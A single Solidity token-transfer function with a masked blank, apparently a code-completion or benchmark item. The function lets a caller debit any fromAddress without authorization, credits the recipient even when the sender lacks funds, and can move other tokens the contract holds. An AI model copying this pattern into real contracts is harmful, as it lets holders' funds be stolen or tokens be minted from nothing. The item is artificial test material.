"function OptimizedTransfer(address tokenAddr, address fromAddress, address toAddress,uint amount) public keepPool returns(bool) {        require((tokenAddr != address(0))&&(toAddress != address(0)));        if(tokenAddr!=address(this)){        ERC20(tokenAddr).transfer(toAddress, amount);        }else{            if(balanceOf[fromAddress] >= amount){                balanceOf[fromAddress] = <mask0>;            }            balanceOf[toAddress] = add(balanceOf[toAddress],amount);                         emit Transfer(fromAddress,toAddress,amount);                     }        return true;    }"